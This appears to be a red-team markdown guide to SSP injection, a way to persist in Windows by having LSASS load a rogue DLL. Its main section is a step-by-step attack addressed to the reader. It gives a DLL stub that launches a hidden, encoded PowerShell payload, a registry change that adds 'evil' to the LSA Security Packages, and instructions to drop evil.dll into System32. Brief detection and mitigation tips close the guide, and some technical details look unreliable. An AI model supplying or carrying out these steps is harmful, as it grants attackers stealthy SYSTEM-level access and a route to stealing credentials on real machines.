# 👻 Ghost Credentials - SSP Injection for Pre-Logon Persistence

**Security Support Provider (SSP) Injection** is a stealth persistence method that loads a malicious DLL into `lsass.exe` at boot or logon by registering it as a custom **Security Support Provider**.

> ⚠️ This is SYSTEM-level, pre-logon access used by red teams, credential stealers, and APTs. It bypasses UAC, runs as part of authentication, and is hard to detect.

---

## 🛠️ What It Does
- SSPs are DLLs loaded by LSASS to handle authentication (e.g., Kerberos, NTLM)
- Attackers register their own SSP DLL via registry
- DLL is loaded at every boot/logon **before user interacts with the system**

---

## 💣 Example: Register a Malicious SSP

### 1. Create Your Malicious DLL
```cpp
BOOL WINAPI SpInitialize(...) {
  WinExec("powershell -nop -w hidden -enc <payload>", 0);
  return 0;
}
```
✅ `SpInitialize` is a required export. LSASS will load and call this on boot

---

### 2. Register SSP in Registry
```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
"Security Packages"=hex(7):6D,00,73,00,76,00,31,00,00,00,65,00,76,00,69,00,6C,00,00,00,00,00
```
✅ Append your DLL name (e.g., `evil`) to the list. Must be in `System32`

---

### 3. Drop DLL to `C:\Windows\System32\evil.dll`
Must be present **before reboot**, or system will BSOD or log an auth error
✅ Upon restart, LSASS loads your DLL as part of the auth stack

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| New entries in `Lsa\Security Packages` | Monitor registry changes to `HKLM\SYSTEM\...\Lsa` |
| LSASS loading non-standard DLLs | Use Sysmon Event ID 7 or ETW tracing to catch `evil.dll` loading from `System32` |
| Boot-time execution of unsigned DLLs | Alert on unsigned binaries in critical boot paths

---

## 🔐 Mitigation Strategies
- Monitor and alert on changes to `Security Packages` reg key
- Block unknown DLLs from being placed in `System32` (requires Admin)
- Use AppLocker/WDAC to restrict which SSPs can be loaded
- Enable Credential Guard to protect LSASS

---

> 🧠 Ghost credentials aren’t just stealthy — they’re **preemptive**. By living inside the logon process, SSP injection gives attackers access before the desktop even loads. Most defenders never see it coming — and never think to look.
